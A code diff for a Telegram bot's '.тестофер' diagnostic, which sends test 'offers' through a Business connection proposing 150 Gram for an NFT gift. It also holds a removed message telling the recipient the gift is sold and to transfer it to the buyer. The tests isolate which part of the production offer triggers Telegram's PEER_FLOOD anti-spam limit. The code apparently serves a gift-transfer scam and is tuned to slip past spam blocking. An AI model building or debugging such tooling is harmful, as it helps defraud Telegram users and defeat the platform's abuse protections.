@@ -2003,58 +2003,91 @@ async def _offer_diag_send(*, message: Message, text: str, reply_markup=None, li
 
 
 async def _run_offer_send_diagnostics(m: Message):
-    """Run five isolated payload tests and expose a final compact summary."""
+    """Run focused first-offer isolation tests. Production .офер is unchanged."""
     bc_id = getattr(m, 'business_connection_id', None)
     if not bc_id:
         return
 
     nft_url = 'https://t.me/nft/PartySparkler-140864'
-    telegraph_url = _offer_diag_help_url()
     no_preview = LinkPreviewOptions(is_disabled=True)
-    callback_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text='Принять', callback_data='offer_diag_accept')]
-    ])
+
+    decline_kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(
+            text='Отклонить',
+            icon_custom_emoji_id='5778527486270770928',
+            callback_data='offer_diag_decline',
+        )
+    ]])
+    accept_kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(
+            text='Принять',
+            icon_custom_emoji_id='5776375003280838798',
+            callback_data='offer_diag_accept',
+        )
+    ]])
     offer_kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text='Отклонить', icon_custom_emoji_id='5778527486270770928', callback_data='offer_diag_decline'),
-        InlineKeyboardButton(text='Принять', icon_custom_emoji_id='5776375003280838798', callback_data='offer_diag_accept'),
+        InlineKeyboardButton(
+            text='Отклонить',
+            icon_custom_emoji_id='5778527486270770928',
+            callback_data='offer_diag_decline',
+        ),
+        InlineKeyboardButton(
+            text='Принять',
+            icon_custom_emoji_id='5776375003280838798',
+            callback_data='offer_diag_accept',
+        ),
     ]])
-    transfer_kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text='Передать', icon_custom_emoji_id='5879770735999717115', url='https://t.me/example')
-    ]])
-    url_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text='Как передать подарок', url=telegraph_url)]
-    ])
-    exact_offer_text = (
+
+    # IMPORTANT: these payloads are sent WITHOUT a diagnostic prefix.
+    # This isolates the exact production-like first-offer components.
+    exact_text = (
         'Пользователь <b>Тестовый Пользователь</b> предлагает Вам <b>150 Gram</b> за подарок '
         '<a href="https://t.me/nft/PartySparkler-140864">Party Sparkler #140,864</a>.\n\n'
         'Предложение действует ещё <b>6ч</b>.'
     )
-    exact_final_text = (
-        '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji> Подарок: '
-        '<a href="https://t.me/nft/PartySparkler-140864">Party Sparkler #140,864</a> успешно продан!\n\n'
-        '<b>• Передайте подарок покупателю для зачисления 150 Gram на ваш баланс.</b>'
+    text_without_link = (
+        'Пользователь <b>Тестовый Пользователь</b> предлагает Вам <b>150 Gram</b> за подарок '
+        'Party Sparkler #140,864.\n\n'
+        'Предложение действует ещё <b>6ч</b>.'
+    )
+    text_without_amount = (
+        'Пользователь <b>Тестовый Пользователь</b> предлагает Вам за подарок '
+        '<a href="https://t.me/nft/PartySparkler-140864">Party Sparkler #140,864</a>.\n\n'
+        'Предложение действует ещё <b>6ч</b>.'
     )
 
     tests = [
+        # 1–5 retained as baseline controls.
         ('TEST 1 — обычный текст', 'Business-маршрут + обычный текст.', None, None),
-        ('TEST 2 — текст + inline-кнопка', 'Business-маршрут + callback inline-кнопка.', callback_kb, None),
-        ('TEST 3 — NFT-ссылка без preview', f'NFT-ссылка без preview: {nft_url}', None, no_preview),
-        ('TEST 4 — NFT-ссылка + inline-кнопка', f'NFT-ссылка + callback inline-кнопка: {nft_url}', callback_kb, no_preview),
-        ('TEST 5 — Telegraph URL-кнопка', 'Только URL-кнопка Telegraph (тестовый payload, НЕ рабочий офер).', url_kb, no_preview),
-        ('TEST 6 — полный первый офер', exact_offer_text, offer_kb, LinkPreviewOptions(show_above_text=True, prefer_large_media=True)),
-        ('TEST 7 — полный первый офер без preview', exact_offer_text, offer_kb, no_preview),
-        ('TEST 8 — полный финальный офер + Передать', exact_final_text, transfer_kb, LinkPreviewOptions(show_above_text=True, prefer_large_media=True)),
+        ('TEST 2 — текст + inline-кнопка', 'Business-маршрут + callback inline-кнопка.', InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text='Принять', callback_data='offer_diag_accept')
+        ]]), None),
+        ('TEST 3 — NFT-ссылка без preview', nft_url, None, no_preview),
+        ('TEST 4 — NFT-ссылка + inline-кнопка', nft_url, InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text='Принять', callback_data='offer_diag_accept')
+        ]]), no_preview),
+        ('TEST 5 — Telegraph URL-кнопка', 'Только URL-кнопка Telegraph (контрольный тест).', InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text='Как передать подарок', url=_offer_diag_help_url())
+        ]]), no_preview),
+
+        # 6–10: focused isolation of the failing first-offer payload.
+        ('TEST 6 — первый офер: точный текст без кнопок', exact_text, None, no_preview),
+        ('TEST 7 — первый офер: текст без NFT-ссылки', text_without_link, None, no_preview),
+        ('TEST 8 — первый офер: точный текст + Отклонить', exact_text, decline_kb, no_preview),
+        ('TEST 9 — первый офер: точный текст + Принять', exact_text, accept_kb, no_preview),
+        ('TEST 10 — первый офер: точный текст + две кнопки', exact_text, offer_kb, no_preview),
     ]
 
     results = []
-    # First test starts immediately. The small delay prevents the diagnostic
-    # itself from becoming an artificial burst that obscures the failing payload.
-    for index, (name, text, markup, preview) in enumerate(tests):
+    for index, (name, payload_text, markup, preview) in enumerate(tests):
         if index:
             await asyncio.sleep(OFFER_DIAG_DELAY)
+
+        # Do not mutate the payload with a TEST label. The failing tests must
+        # be byte-for-byte equivalent to their declared production-like text.
         sent, detail = await _offer_diag_send(
             message=m,
-            text=f'🧪 <b>{name}</b>\n\n{text}',
+            text=payload_text,
             reply_markup=markup,
             link_preview_options=preview,
         )
@@ -2065,26 +2098,42 @@ async def _run_offer_send_diagnostics(m: Message):
             name, ok, detail, getattr(getattr(m, 'chat', None), 'id', None), bc_id,
         )
 
-    summary = ['🧪 <b>ОФЕР-ДИАГНОСТИКА ЗАВЕРШЕНА</b>', '']
+    summary = [
+        '🧪 <b>ОФЕР-ДИАГНОСТИКА V57 ЗАВЕРШЕНА</b>',
+        '',
+        'V57 проверяет именно компоненты первого офера. TEST 6–10 отправляются без диагностического префикса.',
+        '',
+    ]
     for name, ok, detail in results:
         icon = '✅' if ok else '❌'
         short = detail.replace('\n', ' ')[:220]
         summary.append(f'{icon} {name}: {ui.esc(short)}')
-    summary.append('')
-    summary.append('TEST 5 — отдельная Telegraph-кнопка; TEST 6–8 — реальные payload-подобные варианты рабочего офера.')
 
-    # If at least one raw send succeeded, this summary is delivered through the
-    # same Business connection. If the route is fully blocked, the detailed
-    # results remain in logs/giftparser.log rather than falling back to a DM.
+    summary += [
+        '',
+        'Интерпретация:',
+        '• TEST 6 ❌ → проблема уже в тексте первого офера.',
+        '• TEST 6 ✅ + TEST 8/9 ❌ → проблема в custom emoji-кнопке.',
+        '• TEST 8/9 ✅ + TEST 10 ❌ → проблема именно в комбинации двух кнопок.',
+        '• TEST 6–10 ✅ → предыдущий PEER_FLOOD был связан с preview/частотой/контекстом отправки, а не с самим payload.',
+    ]
+
     await asyncio.sleep(OFFER_DIAG_DELAY)
-    sent, detail = await _offer_diag_send(message=m, text='\n'.join(summary), link_preview_options=no_preview)
-    log.info('OFFER DIAG SUMMARY sent=%s detail=%s chat=%s bc=%s', bool(sent), detail, getattr(getattr(m, 'chat', None), 'id', None), bc_id)
+    sent, detail = await _offer_diag_send(
+        message=m,
+        text='\n'.join(summary),
+        link_preview_options=no_preview,
+    )
+    log.info(
+        'OFFER DIAG V57 SUMMARY sent=%s detail=%s chat=%s bc=%s',
+        bool(sent), detail, getattr(getattr(m, 'chat', None), 'id', None), bc_id,
+    )
 
 
 @dp.message(F.text.regexp(r'^\s*\.тестофер\s*$'))
 @dp.business_message(F.text.regexp(r'^\s*\.тестофер\s*$'))
 async def offer_diagnostic_command(m: Message):
-    """Diagnostic command. It must always produce visible feedback; production .офер is unchanged."""
+    """Diagnostic command. Production .офер is unchanged."""
     bc_id = getattr(m, 'business_connection_id', None)
     chat_id = getattr(getattr(m, 'chat', None), 'id', None)
     if not bc_id or not chat_id:
@@ -2096,7 +2145,11 @@ async def offer_diagnostic_command(m: Message):
     try:
         await bot.send_message(
             chat_id=chat_id,
-            text='🧪 <b>Диагностика оферов запущена.</b>\n\nТесты 1–8 будут отправлены последовательно. Рабочий .офер не изменяется.',
+            text=(
+                '🧪 <b>Диагностика оферов V57 запущена.</b>\n\n'
+                'Тесты 1–10 будут отправлены последовательно. '
+                'Рабочий .офер не изменяется.'
+            ),
             business_connection_id=bc_id,
         )
     except Exception as e:
